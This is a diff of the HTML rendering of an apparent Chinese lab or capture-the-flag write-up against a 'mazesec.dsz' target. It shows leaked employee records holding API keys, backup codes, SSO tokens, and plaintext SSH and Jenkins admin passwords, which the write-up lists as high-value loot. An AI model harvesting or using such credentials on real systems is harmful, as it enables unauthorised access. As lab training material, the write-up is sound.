class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Jenkins \u7ba1\u7406\u5458\u5bc6\u7801: Jenkins8038#Admin<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>administrator<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_administrator_8038_725761<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:8038,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>linhao8038<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 8764 ==
-{&quot;api_key&quot;:&quot;sk_internal_297624172687&quot;,&quot;backup_codes&quot;:&quot;[\&quot;946020\&quot;, \&quot;203879\&quot;, \&quot;488566\&quot;, \&quot;401628\&quot;]&quot;,&quot;department&quot;:&quot;\u7814\u53d1\u90e8&quot;,&quot;display_name&quot;:&quot;Gao Yan&quot;,&quot;email&quot;:&quot;gaoyan8764@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$3636850726830173&quot;,&quot;phone&quot;:&quot;13898408861&quot;,&quot;private_notes&quot;:&quot;\u670d\u52a1\u5668 SSH \u5bc6\u7801: R00t8764!Pass&quot;,&quot;role&quot;:&quot;developer&quot;,&quot;sso_token&quot;:&quot;sso_developer_8764_245587&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:8764,&quot;username&quot;:&quot;gaoyan8764&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_297624172687<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>946020<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>203879<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>488566<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>401628<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u7814\u53d1\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Gao Yan<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>gaoyan8764@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$3</span>636850726830173<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13898408861<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u670d\u52a1\u5668 SSH \u5bc6\u7801: R00t8764!Pass<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>developer<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_developer_8764_245587<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:8764,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>gaoyan8764<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 9050 ==
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u9500\u552e\u90e8&quot;,&quot;display_name&quot;:&quot;Xu Wei&quot;,&quot;email&quot;:&quot;xuwei9050@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13879705234&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;sales&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:9050,&quot;username&quot;:&quot;xuwei9050&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u9500\u552e\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Xu Wei<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>xuwei9050@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13879705234<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sales<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:9050,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>xuwei9050<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 9182 ==
-{&quot;api_key&quot;:&quot;sk_internal_540094580489&quot;,&quot;backup_codes&quot;:&quot;[\&quot;480869\&quot;, \&quot;614114\&quot;, \&quot;931691\&quot;, \&quot;229605\&quot;]&quot;,&quot;department&quot;:&quot;\u8fd0\u7ef4\u90e8&quot;,&quot;display_name&quot;:&quot;Zhou San&quot;,&quot;email&quot;:&quot;zhousan9182@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$3482634224079702&quot;,&quot;phone&quot;:&quot;13872573968&quot;,&quot;private_notes&quot;:&quot;\u4f01\u4e1a\u5fae\u4fe1 webhook: https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=385237898&quot;,&quot;role&quot;:&quot;ops&quot;,&quot;sso_token&quot;:&quot;sso_ops_9182_701469&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:9182,&quot;username&quot;:&quot;zhousan9182&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_540094580489<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>480869<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>614114<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>931691<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>229605<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u8fd0\u7ef4\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Zhou San<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhousan9182@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$3</span>482634224079702<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13872573968<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u4f01\u4e1a\u5fae\u4fe1 webhook: https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=385237898<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>ops<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_ops_9182_701469<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:9182,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhousan9182<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 9409 ==
-{&quot;api_key&quot;:&quot;sk_internal_747986912366&quot;,&quot;backup_codes&quot;:&quot;[\&quot;518583\&quot;, \&quot;522657\&quot;, \&quot;645729\&quot;, \&quot;380194\&quot;]&quot;,&quot;department&quot;:&quot;\u4eba\u529b\u8d44\u6e90\u90e8&quot;,&quot;display_name&quot;:&quot;Zhou Peng&quot;,&quot;email&quot;:&quot;zhoupeng9409@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$1754794148606713&quot;,&quot;phone&quot;:&quot;13811811655&quot;,&quot;private_notes&quot;:&quot;VPN \u914d\u7f6e\u6587\u4ef6: /etc/openvpn/client9409.ovpn&quot;,&quot;role&quot;:&quot;hr&quot;,&quot;sso_token&quot;:&quot;sso_hr_9409_230834&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:9409,&quot;username&quot;:&quot;zhoupeng9409&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_747986912366<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>518583<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>522657<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>645729<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>380194<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u4eba\u529b\u8d44\u6e90\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Zhou Peng<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhoupeng9409@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$1</span>754794148606713<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13811811655<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>VPN \u914d\u7f6e\u6587\u4ef6: /etc/openvpn/client9409.ovpn<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>hr<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_hr_9409_230834<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:9409,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhoupeng9409<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 9944 ==
-{&quot;api_key&quot;:&quot;sk_internal_577387369293&quot;,&quot;backup_codes&quot;:&quot;[\&quot;308810\&quot;, \&quot;955013\&quot;, \&quot;236079\&quot;, \&quot;354299\&quot;]&quot;,&quot;department&quot;:&quot;\u5b89\u5168\u90e8&quot;,&quot;display_name&quot;:&quot;Zhu Wei&quot;,&quot;email&quot;:&quot;zhuwei9944@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$8949234492517412&quot;,&quot;phone&quot;:&quot;13814692474&quot;,&quot;private_notes&quot;:&quot;VPN \u914d\u7f6e\u6587\u4ef6: /etc/openvpn/client9944.ovpn&quot;,&quot;role&quot;:&quot;security&quot;,&quot;sso_token&quot;:&quot;sso_security_9944_322993&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:9944,&quot;username&quot;:&quot;zhuwei9944&quot;,&quot;vpn_access&quot;:true}
-</code></pre>
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_577387369293<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>308810<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>955013<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>236079<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>354299<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u5b89\u5168\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Zhu Wei<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhuwei9944@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$8</span>949234492517412<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13814692474<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>VPN \u914d\u7f6e\u6587\u4ef6: /etc/openvpn/client9944.ovpn<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>security<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_security_9944_322993<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:9944,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhuwei9944<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}</pre></div>
 <p>到这里，敏感信息泄露已经非常完整了。除了用户名、部门、邮箱、手机号之外，还拿到了大量内部敏感数据。</p>
 <h3>从泄露数据中可直接获得的内容</h3>
 <p>可以总结出以下几类高价值信息：</p>
 <h4>1. SSH 明文密码</h4>
-<pre lang="text"><code>gaoyan8764 / R00t8764!Pass
+<pre lang="text" class="notranslate"><code class="notranslate">gaoyan8764 / R00t8764!Pass
 </code></pre>
 <p>对应记录：</p>
-<pre lang="json"><code>{&quot;api_key&quot;:&quot;sk_internal_297624172687&quot;,&quot;backup_codes&quot;:&quot;[\&quot;946020\&quot;, \&quot;203879\&quot;, \&quot;488566\&quot;, \&quot;401628\&quot;]&quot;,&quot;department&quot;:&quot;研发部&quot;,&quot;display_name&quot;:&quot;Gao Yan&quot;,&quot;email&quot;:&quot;gaoyan8764@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$3636850726830173&quot;,&quot;phone&quot;:&quot;13898408861&quot;,&quot;private_notes&quot;:&quot;服务器 SSH 密码: R00t8764!Pass&quot;,&quot;role&quot;:&quot;developer&quot;,&quot;sso_token&quot;:&quot;sso_developer_8764_245587&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:8764,&quot;username&quot;:&quot;gaoyan8764&quot;,&quot;vpn_access&quot;:true}
-</code></pre>
+<div class="highlight highlight-source-json"><pre class="notranslate">{<span class="pl-ent">"api_key"</span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_297624172687<span class="pl-pds">"</span></span>,<span class="pl-ent">"backup_codes"</span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>946020<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>203879<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>488566<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>401628<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-ent">"department"</span>:<span class="pl-s"><span class="pl-pds">"</span>研发部<span class="pl-pds">"</span></span>,<span class="pl-ent">"display_name"</span>:<span class="pl-s"><span class="pl-pds">"</span>Gao Yan<span class="pl-pds">"</span></span>,<span class="pl-ent">"email"</span>:<span class="pl-s"><span class="pl-pds">"</span>gaoyan8764@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-ent">"has_secret"</span>:<span class="pl-c1">true</span>,<span class="pl-ent">"password_hash"</span>:<span class="pl-s"><span class="pl-pds">"</span>$2b$12$3636850726830173<span class="pl-pds">"</span></span>,<span class="pl-ent">"phone"</span>:<span class="pl-s"><span class="pl-pds">"</span>13898408861<span class="pl-pds">"</span></span>,<span class="pl-ent">"private_notes"</span>:<span class="pl-s"><span class="pl-pds">"</span>服务器 SSH 密码: R00t8764!Pass<span class="pl-pds">"</span></span>,<span class="pl-ent">"role"</span>:<span class="pl-s"><span class="pl-pds">"</span>developer<span class="pl-pds">"</span></span>,<span class="pl-ent">"sso_token"</span>:<span class="pl-s"><span class="pl-pds">"</span>sso_developer_8764_245587<span class="pl-pds">"</span></span>,<span class="pl-ent">"status"</span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-ent">"uid"</span>:<span class="pl-c1">8764</span>,<span class="pl-ent">"username"</span>:<span class="pl-s"><span class="pl-pds">"</span>gaoyan8764<span class="pl-pds">"</span></span>,<span class="pl-ent">"vpn_access"</span>:<span class="pl-c1">true</span>}</pre></div>
 <h4>2. Jenkins 管理员密码</h4>
-<pre lang="text"><code>Jenkins6530#Admin
+<pre lang="text" class="notranslate"><code class="notranslate">Jenkins6530#Admin
 Jenkins7920#Admin
 Jenkins8038#Admin
 </code></pre>
 <p>对应三条记录分别是：</p>
-<pre lang="json"><code>{&quot;api_key&quot;:&quot;sk_internal_116444220617&quot;,&quot;backup_codes&quot;:&quot;[\&quot;648495\&quot;, \&quot;289168\&quot;, \&quot;375326\&quot;, \&quot;604194\&quot;]&quot;,&quot;department&quot;:&quot;研发二部&quot;,&quot;display_name&quot;:&quot;Sun Fei&quot;,&quot;email&quot;:&quot;sunfei6530@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$5364283556298436&quot;,&quot;phone&quot;:&quot;13881139200&quot;,&quot;private_notes&quot;:&quot;Jenkins 管理员密码: Jenkins6530#Admin&quot;,&quot;role&quot;:&quot;developer&quot;,&quot;sso_token&quot;:&quot;sso_developer_6530_717712&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:6530,&quot;username&quot;:&quot;sunfei6530&quot;,&quot;vpn_access&quot;:true}
-</code></pre>
-<pre lang="json"><code>{&quot;api_key&quot;:&quot;sk_internal_464766883623&quot;,&quot;backup_codes&quot;:&quot;[\&quot;260921\&quot;, \&quot;288066\&quot;, \&quot;463417\&quot;, \&quot;894174\&quot;]&quot;,&quot;department&quot;:&quot;人力资源部&quot;,&quot;display_name&quot;:&quot;He Long&quot;,&quot;email&quot;:&quot;helong7920@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$1045328665585101&quot;,&quot;phone&quot;:&quot;13830690378&quot;,&quot;private_notes&quot;:&quot;Jenkins 管理员密码: Jenkins7920#Admin&quot;,&quot;role&quot;:&quot;hr&quot;,&quot;sso_token&quot;:&quot;sso_hr_7920_528232&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:7920,&quot;username&quot;:&quot;helong7920&quot;,&quot;vpn_access&quot;:true}
-</code></pre>
-<pre lang="json"><code>{&quot;api_key&quot;:&quot;sk_internal_974818108609&quot;,&quot;backup_codes&quot;:&quot;[\&quot;344818\&quot;, \&quot;988944\&quot;, \&quot;873105\&quot;, \&quot;266046\&quot;]&quot;,&quot;department&quot;:&quot;信息技术部&quot;,&quot;display_name&quot;:&quot;Lin Hao&quot;,&quot;email&quot;:&quot;linhao8038@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$7096212241602057&quot;,&quot;phone&quot;:&quot;13853496395&quot;,&quot;private_notes&quot;:&quot;Jenkins 管理员密码: Jenkins8038#Admin&quot;,&quot;role&quot;:&quot;administrator&quot;,&quot;sso_token&quot;:&quot;sso_administrator_8038_725761&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:8038,&quot;username&quot;:&quot;linhao8038&quot;,&quot;vpn_access&quot;:true}
-</code></pre>
+<div class="highlight highlight-source-json"><pre class="notranslate">{<span class="pl-ent">"api_key"</span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_116444220617<span class="pl-pds">"</span></span>,<span class="pl-ent">"backup_codes"</span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>648495<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>289168<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>375326<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>604194<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-ent">"department"</span>:<span class="pl-s"><span class="pl-pds">"</span>研发二部<span class="pl-pds">"</span></span>,<span class="pl-ent">"display_name"</span>:<span class="pl-s"><span class="pl-pds">"</span>Sun Fei<span class="pl-pds">"</span></span>,<span class="pl-ent">"email"</span>:<span class="pl-s"><span class="pl-pds">"</span>sunfei6530@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-ent">"has_secret"</span>:<span class="pl-c1">true</span>,<span class="pl-ent">"password_hash"</span>:<span class="pl-s"><span class="pl-pds">"</span>$2b$12$5364283556298436<span class="pl-pds">"</span></span>,<span class="pl-ent">"phone"</span>:<span class="pl-s"><span class="pl-pds">"</span>13881139200<span class="pl-pds">"</span></span>,<span class="pl-ent">"private_notes"</span>:<span class="pl-s"><span class="pl-pds">"</span>Jenkins 管理员密码: Jenkins6530#Admin<span class="pl-pds">"</span></span>,<span class="pl-ent">"role"</span>:<span class="pl-s"><span class="pl-pds">"</span>developer<span class="pl-pds">"</span></span>,<span class="pl-ent">"sso_token"</span>:<span class="pl-s"><span class="pl-pds">"</span>sso_developer_6530_717712<span class="pl-pds">"</span></span>,<span class="pl-ent">"status"</span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-ent">"uid"</span>:<span class="pl-c1">6530</span>,<span class="pl-ent">"username"</span>:<span class="pl-s"><span class="pl-pds">"</span>sunfei6530<span class="pl-pds">"</span></span>,<span class="pl-ent">"vpn_access"</span>:<span class="pl-c1">true</span>}</pre></div>
+<div class="highlight highlight-source-json"><pre class="notranslate">{<span class="pl-ent">"api_key"</span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_464766883623<span class="pl-pds">"</span></span>,<span class="pl-ent">"backup_codes"</span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>260921<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>288066<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>463417<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>894174<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-ent">"department"</span>:<span class="pl-s"><span class="pl-pds">"</span>人力资源部<span class="pl-pds">"</span></span>,<span class="pl-ent">"display_name"</span>:<span class="pl-s"><span class="pl-pds">"</span>He Long<span class="pl-pds">"</span></span>,<span class="pl-ent">"email"</span>:<span class="pl-s"><span class="pl-pds">"</span>helong7920@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-ent">"has_secret"</span>:<span class="pl-c1">true</span>,<span class="pl-ent">"password_hash"</span>:<span class="pl-s"><span class="pl-pds">"</span>$2b$12$1045328665585101<span class="pl-pds">"</span></span>,<span class="pl-ent">"phone"</span>:<span class="pl-s"><span class="pl-pds">"</span>13830690378<span class="pl-pds">"</span></span>,<span class="pl-ent">"private_notes"</span>:<span class="pl-s"><span class="pl-pds">"</span>Jenkins 管理员密码: Jenkins7920#Admin<span class="pl-pds">"</span></span>,<span class="pl-ent">"role"</span>:<span class="pl-s"><span class="pl-pds">"</span>hr<span class="pl-pds">"</span></span>,<span class="pl-ent">"sso_token"</span>:<span class="pl-s"><span class="pl-pds">"</span>sso_hr_7920_528232<span class="pl-pds">"</span></span>,<span class="pl-ent">"status"</span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-ent">"uid"</span>:<span class="pl-c1">7920</span>,<span class="pl-ent">"username"</span>:<span class="pl-s"><span class="pl-pds">"</span>helong7920<span class="pl-pds">"</span></span>,<span class="pl-ent">"vpn_access"</span>:<span class="pl-c1">true</span>}</pre></div>
